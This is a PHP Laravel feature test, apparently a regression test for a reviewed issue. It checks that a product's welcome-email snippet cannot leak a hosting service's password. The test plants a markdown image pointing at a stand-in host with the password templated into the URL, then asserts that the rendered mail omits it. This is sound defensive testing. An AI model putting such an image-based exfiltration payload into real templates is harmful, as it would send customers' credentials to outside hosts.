<?php

namespace Tests\Feature;

use App\Helpers\NotificationHelper;
use App\Mail\Mail as MyCSMail;
use App\Models\Service;
use App\Models\User;
use App\Services\Service\WelcomeMail;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Tests\TestCase;

/**
 * Review of #911: the welcome mail's text is now a full admin's only (NotificationTemplatePolicy, PRIVATE_TEMPLATES), but
 * a product's «email_template» snippet (admin.products.update) is rendered into it as {{ product_info }} with the same
 * data, the service's password included: an image in the snippet sends the password elsewhere, as the policy meant to stop.
 */
class Rev911WelcomeSnippetTest extends TestCase
{
    use RefreshDatabase;

    public function test_a_products_snippet_cannot_carry_the_welcome_password_to_another_host(): void
    {
        Queue::fake();
        Mail::fake();
        config(['settings.mail_disable' => false, 'settings.default_currency' => 'USD']);
        $owner = User::factory()->create();
        $product = $this->createProduct();
        $product->product->update(['email_template' => '![logo](https://collector.test/p.png?k={{ service_password }})']);
        $service = Service::factory()->create(['client_id' => $owner->client()->id, 'plan_id' => $product->plan->id, 'product_id' => $product->product->id,
            'status' => 'active', 'currency_code' => 'USD', 'price' => 10, 'expires_at' => now()->addMonth(),
            'domain' => 'example.test', 'username' => 'exampl', 'password' => 'Sn1ppet-Secret']);

        NotificationHelper::serverCreatedNotification($service->client, $service);

        $mail = Mail::queued(MyCSMail::class, fn (MyCSMail $mail) => $mail->templateKey === WelcomeMail::TEMPLATE)->first();
        $this->assertNotNull($mail, 'the welcome mail went');
        $this->assertStringNotContainsString('collector.test/p.png?k=Sn1ppet-Secret', (string) $mail->render());
    }
}
